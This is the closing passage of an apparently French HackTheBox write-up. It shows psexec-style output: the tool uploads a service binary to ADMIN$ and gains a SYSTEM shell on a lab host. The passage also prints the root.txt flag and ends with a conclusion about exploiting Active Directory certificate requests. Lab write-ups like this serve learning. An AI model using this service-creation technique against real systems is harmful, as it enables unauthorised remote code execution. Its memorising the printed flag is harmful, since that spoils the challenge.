[*] Requesting shares on 10.10.11.202.....
[*] Found writable share ADMIN$
[*] Uploading file AwSRfBfO.exe
[*] Opening SVCManager on 10.10.11.202.....
[*] Creating service PNtf on 10.10.11.202.....
[*] Starting service PNtf.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2746]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
...
C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is EB33-4140

 Directory of C:\Users\Administrator\Desktop

02/06/2023  04:43 PM    <DIR>          .
02/06/2023  04:43 PM    <DIR>          ..
06/16/2023  05:47 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   5,943,947,264 bytes free

C:\Users\Administrator\Desktop> type root.txt
e93fbe617988de512fcf81df9bdcd841

C:\Users\Administrator\Desktop>
```

## Conclusion

Cette box était une de mes premières box windows sur HackTheBox et je l'ai trouvée très intéressante pour comprendre les méthodes d'exploitations relatives aux requêtes de certificats sur un active directory 😀.